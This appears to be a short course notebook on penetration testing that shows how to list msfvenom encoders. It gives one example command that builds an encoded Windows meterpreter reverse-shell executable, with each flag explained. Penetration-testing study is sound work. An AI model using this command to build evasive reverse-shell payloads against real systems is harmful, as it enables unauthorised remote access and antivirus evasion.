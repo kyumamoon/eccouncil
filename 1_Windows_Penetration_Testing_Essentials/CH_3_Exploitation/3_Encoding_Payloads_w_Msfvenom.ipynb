{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Encoding Payloads with Msfvenom**"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Listing encoders**\n",
    "- msfvenom --list encoders"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Encoding Payloads**\n",
    "- Example:\n",
    "    - msfvenom -a x64 -p windows/meterpreter/reverse_tcp LHOST=<HOST IP> LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -b '\\x00\\xff' encoded.exe\n",
    "        - a, architect\n",
    "        - p, payload\n",
    "        - LHOST, host ip\n",
    "        - LPORT, port\n",
    "        - f, payload format\n",
    "        - e, encoder\n",
    "        - i, iteration of encoder. more better\n",
    "        - b, bad characters to avoid in encode\n",
    "        - lastly, filename"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
